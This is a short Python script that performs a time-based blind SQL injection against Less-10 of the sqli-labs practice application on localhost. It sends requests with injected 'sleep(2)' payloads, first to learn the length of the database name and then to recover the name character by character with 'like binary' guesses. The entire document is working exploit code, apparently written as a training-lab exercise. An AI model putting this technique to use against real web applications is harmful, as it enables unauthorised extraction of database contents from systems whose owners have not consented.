import requests

url = 'http://localhost/sqli-labs-php7/Less-10/?id=0" '

dblen=0
for i in range(100):
    length = url + "or 1=1 and length(database())=" + str(i) + " and sleep(2)-- -"
    result=requests.get(length)
    if result.elapsed.seconds>=2:
        print (i)
        dblen=i
        break

options='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
flag=''
for i in range(dblen):
    for j in options:
        name = url + "or 1=1 and database() like binary '"+flag+j+"%' and sleep(2)-- -"
        result=requests.get(name)
        if result.elapsed.seconds>=2:
            flag=flag+j
            print (flag)
            break
print('\n'+flag)
